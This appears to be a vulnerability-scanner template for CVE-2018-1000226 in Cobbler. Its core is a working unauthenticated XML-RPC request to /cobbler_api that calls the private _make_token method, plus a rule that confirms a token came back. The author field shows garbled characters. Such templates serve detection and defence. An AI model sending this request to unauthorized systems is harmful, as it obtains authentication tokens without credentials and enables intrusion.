name: poc-yaml-cobbler-cve-2018-1000226-unauth
binding: bc9a1d4d-d6c0-4570-abd9-636e0430021a
manual: true
detail:
    author: Â∞èz
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2018-1000226
    vulnerability:
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cobbler_api
            headers:
                Content-Type: text/xml
            body: |-
                <?xml version='1.0'?>
                        <methodCall>
                          <methodName>_CobblerXMLRPCInterface__make_token</methodName>
                          <params>
                            <param>
                              <value>
                                <string>cobbler</string>
                              </value>
                            </param>
                          </params>
                        </methodCall>
            follow_redirects: false
        expression: response.status == 200 && response.headers["Content-Type"] == "text/xml" && response.body_string.contains("<methodResponse>") && ".*[a-zA-Z0-9].+==</string></value>".matches(response.body_string)
expression: r0()
